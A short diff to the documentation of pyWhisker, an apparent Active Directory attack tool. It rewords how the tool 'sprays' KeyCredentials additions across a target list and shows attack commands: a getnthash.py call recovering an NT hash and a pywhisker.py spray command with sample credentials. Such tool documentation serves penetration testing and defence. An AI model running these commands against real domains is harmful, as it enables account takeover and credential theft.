@@ -156,7 +156,7 @@ python3 PKINITtools/getnthash.py -key 894fde81fb7cf87963e4bda9e9e288536a0508a155
 ![](./.assets/add_pem_gettgtnthash.png)
 
 ## Spray new values
-pyWhisker can identify and exploit adding KeyCredentials to a target list based on any vulnerable write permissions.
+pyWhisker can chain multiple KeyCredentials additions, to a set of targets, i.e. spray (if the credentials used have the right permissions).
 
 ```shell
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target-list targetlist.txt --action "spray"
